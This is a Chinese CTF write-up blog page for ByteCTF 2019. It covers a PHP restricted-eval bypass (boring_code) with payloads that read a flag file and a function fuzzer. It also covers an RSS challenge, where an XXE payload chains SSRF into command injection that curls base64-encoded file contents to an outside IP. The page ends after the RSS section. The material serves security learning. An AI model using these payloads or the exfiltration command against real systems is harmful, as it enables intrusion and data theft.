@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0x00 前言周末的比赛质量还是挺高的，特别是boring_code，有点烧脑但是做的就很开心。 文章首发合天实验室，转载请注意版权。 0x01 boring_code题目描述http://112.125.25.2:9999 题目解答题目上来的邮件源码中给了提示，所直接分析目录得到了对应的程序源码123456789101112131415161718192021222324252627282930">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2019 bytectf writeup">
+<meta property="og:url" content="http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/index.html">
+<meta property="og:site_name" content="Z3R0YU">
+<meta property="og:description" content="0x00 前言周末的比赛质量还是挺高的，特别是boring_code，有点烧脑但是做的就很开心。 文章首发合天实验室，转载请注意版权。 0x01 boring_code题目描述http://112.125.25.2:9999 题目解答题目上来的邮件源码中给了提示，所直接分析目录得到了对应的程序源码123456789101112131415161718192021222324252627282930">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.loli.net/2019/09/14/fnAD8hJCj4UQeMN.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/14/qXTpclsheSrxAUN.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/14/AviDaUmQtSrYs4I.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/14/ZeRuhaHM8xNiFws.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/14/QmRkhdI68wvWUGn.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/14/7RdApN51tFYBfQ3.png">
+<meta property="og:updated_time" content="2019-09-14T15:28:18.335Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="2019 bytectf writeup">
+<meta name="twitter:description" content="0x00 前言周末的比赛质量还是挺高的，特别是boring_code，有点烧脑但是做的就很开心。 文章首发合天实验室，转载请注意版权。 0x01 boring_code题目描述http://112.125.25.2:9999 题目解答题目上来的邮件源码中给了提示，所直接分析目录得到了对应的程序源码123456789101112131415161718192021222324252627282930">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/14/fnAD8hJCj4UQeMN.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>2019 bytectf writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml">
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/09/14/2019-sctf-writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/09/05/2019-suctf-writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&text=2019 bytectf writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&title=2019 bytectf writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&is_video=false&description=2019 bytectf writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2019 bytectf writeup&body=Check out this article: http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&title=2019 bytectf writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&title=2019 bytectf writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&title=2019 bytectf writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&title=2019 bytectf writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2019/09/14/2019-bytectf-writeup/&name=2019 bytectf writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-boring-code"><span class="toc-number">2.</span> <span class="toc-text">0x01 boring_code</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述"><span class="toc-number">2.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答"><span class="toc-number">2.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-RSS"><span class="toc-number">3.</span> <span class="toc-text">0x02 RSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-1"><span class="toc-number">3.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-1"><span class="toc-number">3.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-ezcms"><span class="toc-number">4.</span> <span class="toc-text">0x03 ezcms</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目描述-2"><span class="toc-number">4.0.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#题目解答-2"><span class="toc-number">4.0.2.</span> <span class="toc-text">题目解答</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        2019 bytectf writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Z3R0YU</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-09-14T15:21:58.000Z" itemprop="datePublished">2019-09-14</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>周末的比赛质量还是挺高的，特别是boring_code，有点烧脑但是做的就很开心。</p>
+<p>文章首发合天实验室，转载请注意版权。</p>
+<h2 id="0x01-boring-code"><a href="#0x01-boring-code" class="headerlink" title="0x01 boring_code"></a>0x01 boring_code</h2><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://112.125.25.2:9999" target="_blank" rel="noopener">http://112.125.25.2:9999</a></p>
+<h4 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h4><p>题目上来的邮件源码中给了提示，所直接分析目录得到了对应的程序源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid_url</span><span class="params">($url)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (preg_match(<span class="string">'/data:\/\//i'</span>, $url)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>])) &#123;</span><br><span class="line">	$url = $_POST[<span class="string">'url'</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_valid_url($url)) &#123;</span><br><span class="line">		$r = parse_url($url);</span><br><span class="line">		print_r($r);</span><br><span class="line">		<span class="keyword">if</span> (preg_match(<span class="string">'/baidu\.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"pass preg_match"</span>;</span><br><span class="line">			$code = file_get_contents($url);</span><br><span class="line">			print_r($code);</span><br><span class="line">			<span class="comment">// 下面这个正则约束了只能是phpinfo();这样的形式</span></span><br><span class="line">			<span class="comment">// 所以基本来说 php://input 是不行了</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $code)) &#123;</span><br><span class="line">				<span class="keyword">if</span> (preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span>, $code)) &#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">'bye~'</span>;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">eval</span>($code);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"error: host not allowed"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"error: invalid url"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到这个题目基本是以<code>file_get_contents</code>函数为界限分为了两个部分：</p>
+<ol>
+<li>需要bypass <code>filter_var</code> 、 <code>parse_url</code>  和 <code>preg_match(&#39;/baidu\.com$/&#39;, $r[&#39;host&#39;])</code>  这三个函数的限制；</li>
+<li>需要bypass 在<code>eval</code>函数之前的那一堆正则限制</li>
+</ol>
+<p>首先针对第一个部分，我所知的有三种解决方案:</p>
+<ol>
+<li>购买一个含有baidu.com字符的域名，比如<code>z3r0yu.bytebaidu.com</code> （刚开始bypass太困难，5am3师傅咬了咬牙直接就买了，氪金解决一切啊）</li>
+<li>使用ftp协议，<code>ftp://ip:port,baidu.com:80/filename.txt</code></li>
+<li>使用一个百度的任意跳转的漏洞（还真有）<code>post.baidu.com</code> ，具体可以参考 <a href="https://www.4xseo.com/marketing/1280/#title-0" target="_blank" rel="noopener">链接</a></li>
+</ol>
+<p>第一部分过了之后就需要bypass对shell的限制了，因为此处限制的比较死，所以之前的那些执行方式就统统失效了</p>
+<p>首先先构思一个简单的payload，如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(&apos;.&apos;))));</span><br></pre></td></tr></table></figure></p>
+<p>因为 <code>.</code> 对应的是 chr(46)，所以payload就可以是如下的形式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(46)))));</span><br></pre></td></tr></table></figure></p>
+<p>但是正则表达式限制了不能够在函数中使用参数，所以之后我们可以看看系统中还剩什么函数可以使用</p>
+<p>可以使用如下方式来进行初步fuzz</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">var_dump(gettype(get_defined_functions()));</span><br><span class="line">var_dump(count(get_defined_functions()[internal]));</span><br><span class="line"><span class="comment">// var_dump(preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', '111'));</span></span><br><span class="line"></span><br><span class="line">$i_need_func=<span class="keyword">array</span>();</span><br><span class="line">$j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; count(get_defined_functions()[internal]) ; $i++) &#123; </span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|xdebug|prvd|_|-/i'</span>, get_defined_functions()[internal][$i])) &#123;</span><br><span class="line">        $i_need_func[$j]=get_defined_functions()[internal][$i];</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print_r($i_need_func);</span><br></pre></td></tr></table></figure>
+<p>可以看到基本使用函数来获取外部导入变量是不可能的了，但是关注到一个函数 <code>phpversion()</code> 可以返回对应的php版本，也就是 7 这个数字</p>
+<p>那么接下来就是数学题了，如何利用剩下的数学函数来构造出数字 46 , 最终利用如下方式构造出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))));</span><br></pre></td></tr></table></figure>
+<p>从而得到了 <code>.</code></p>
+<p>PS: 随后也fuzz出 <code>localeconv()</code> 函数的返回值中有一个 <code>.</code> (fuzz脚本附在最后)</p>
+<p>所以此时已经可以可以完成对当前目录文件的读取，但是题目提示文件是在上一层目录中，所以我们还需要构造 <code>..</code> 来跳到上一级目录，此处刚开始也卡了好久，但随后突然想到 <code>ls -a</code> 之后系统不就自带两点，这不是系统特性嘛，所以就有了如下paylaod</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))));</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/09/14/fnAD8hJCj4UQeMN.png" alt="2E4F324A-D809-4F3C-8168-0829EDF82DF6.png"></p>
+<p>之后就是使用<code>chr</code>函数进行跳到上一级目录，但是跳完还有一个问题，就是该怎么再次获取一个<code>.</code>出来，<code>chr</code>函数的返回值是布尔值，那么之后就将布尔值True作为参数放在fuzzer中看能得到什么结果，最后fuzz轮次不一样时发现 <code>time</code> 函数返回的结果也不一样，随后查了一下手册，便意识到可以使用这种方式来进行构造一个46出来，所以构造出如下payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localtime(time(1))</span><br></pre></td></tr></table></figure>
+<p>综上就可以构造出payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</span><br></pre></td></tr></table></figure></p>
+<p>另一种payload可以构造如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv()))))))))))));</span><br></pre></td></tr></table></figure></p>
+<p>所以这题再限制一下长度估计会更难</p>
+<p>我在解题时使用的粗糙fuzzer<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(gettype(get_defined_functions()));</span><br><span class="line">var_dump(count(get_defined_functions()[internal]));</span><br><span class="line"><span class="comment">// var_dump(preg_match('/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i', '111'));</span></span><br><span class="line"></span><br><span class="line">$i_need_func=<span class="keyword">array</span>();</span><br><span class="line">$j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; count(get_defined_functions()[internal]) ; $i++) &#123; </span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log|xdebug|prvd|_/i'</span>, get_defined_functions()[internal][$i])) &#123;</span><br><span class="line">        $i_need_func[$j]=get_defined_functions()[internal][$i];</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// print_r($i_need_func);</span></span><br><span class="line"><span class="comment">// $res=array();</span></span><br><span class="line"><span class="comment">// $t=0;</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; count($i_need_func); $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span>(!is_null($i_need_func[$i]()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $i_need_func[$i];</span><br><span class="line">            var_dump($i_need_func[$i]());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// if (var_dump(print_r($i_need_func[$i](chr(46))))) &#123;</span></span><br><span class="line">        <span class="comment">//     echo $i_need_func[$i];</span></span><br><span class="line">        <span class="comment">//     $res[$t]=$i_need_func[$i];</span></span><br><span class="line">        <span class="comment">//     $t++;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (\Throwable $th) &#123;</span><br><span class="line">    <span class="comment">//throw $th;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// print_r($res);</span></span><br></pre></td></tr></table></figure></p>
+<p>最后再简要提一下我看到的另外两种payload</p>
+<p>两中payload都是利用了hash的特征</p>
+<p>paylaod1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</span><br></pre></td></tr></table></figure></p>
+<p>原理：hebrevc(crypt(arg))可以随机生成一个hash值 第一个字符随机是 $(大概率) 或者 .(小概率) 然后通过ord chr只取第一个字符</p>
+<p><img src="https://i.loli.net/2019/09/14/qXTpclsheSrxAUN.png" alt="D4BB0F3D-0D73-41EC-A68C-F5374EA53376.png"></p>
+<p>payload2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))readfile(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))));</span><br></pre></td></tr></table></figure></p>
+<p>原理：crypt(serialize(array())) 原因同上</p>
+<p><img src="https://i.loli.net/2019/09/14/AviDaUmQtSrYs4I.png" alt="2C65B93D-2D28-4C12-8E88-ADF9C90C5DF6.png"></p>
+<p>PS: 这种也可以利用fuzzer发现，就像发现time函数那样，检测轮次中结果的变化即可</p>
+<h2 id="0x02-RSS"><a href="#0x02-RSS" class="headerlink" title="0x02 RSS"></a>0x02 RSS</h2><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://112.126.96.50:9999" target="_blank" rel="noopener">http://112.126.96.50:9999</a></p>
+<h4 id="题目解答-1"><a href="#题目解答-1" class="headerlink" title="题目解答"></a>题目解答</h4><p>这题基本是个原题，只是 <code>create_function</code> 的位置改变了，任意文件读取改成了xxe来完成，域名限制的突破也可以使用购买域名来实现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /fetch HTTP/1.1</span><br><span class="line">Host: 112.126.96.50:9999</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://112.126.96.50:9999/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 49</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">rss_url=http://z3r0yu.bytebaidu.com:2233/exp7.xml</span><br></pre></td></tr></table></figure>
+<p>payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [&lt;!ENTITY test SYSTEM "http://localhost/rss_in_order?rss_url=http%3a%2f%2f47.90.204.28%3a2233%2ffile.xml&amp;order=description%2c%22c%22)%3b%7dsystem(%22curl+http%3a%2f%2f47.90.204.28%3a2233%2f%60cat%20%2fflag_eb8ba2eb07702e69963a7d6ab8669134%20%7c%20base64%60%22)%3b%2f%2f"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">"2.0"</span> <span class="attr">xmlns:atom</span>=<span class="string">"http://www.w3.org/2005/Atom"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>先知安全技术社区<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xz.aliyun.com/forum/<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>先知安全技术社区<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">atom:link</span> <span class="attr">href</span>=<span class="string">"http://xz.aliyun.com/forum/feed/"</span> <span class="attr">rel</span>=<span class="string">"self"</span>&gt;</span><span class="tag">&lt;/<span class="name">atom:link</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">language</span>&gt;</span>zh-hans<span class="tag">&lt;/<span class="name">language</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Tue, 02 Jul 2019 06:03:00 +0800<span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xz.aliyun.com/t/5514<span class="tag">&lt;/<span class="name">link</span>&gt;</span><span class="tag">&lt;<span class="name">description</span>&gt;</span>利用Excel power query实现远程DDE执行<span class="tag">&lt;/<span class="name">description</span>&gt;</span><span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Tue, 02 Jul 2019 06:03:00 +0800<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span><span class="tag">&lt;<span class="name">guid</span>&gt;</span>http://xz.aliyun.com/t/5514<span class="tag">&lt;/<span class="name">guid</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>CVE-2019-0221—Apache Tomcat SSI printenv指令中的XSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">link</span>&gt;</span>http://xz.aliyun.com/t/5310<span class="tag">&lt;/<span class="name">link</span>&gt;</span><span class="tag">&lt;<span class="name">description</span>&gt;</span>CVE-2019-0221—Apache Tomcat SSI printenv指令中的XSS<span class="tag">&lt;/<span class="name">description</span>&gt;</span><span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Mon, 03 Jun 2019 09:09:00 +0800<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span><span class="tag">&lt;<span class="name">guid</span>&gt;</span>http://xz.aliyun.com/t/5310<span class="tag">&lt;/<span class="name">guid</span>&gt;</span><span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
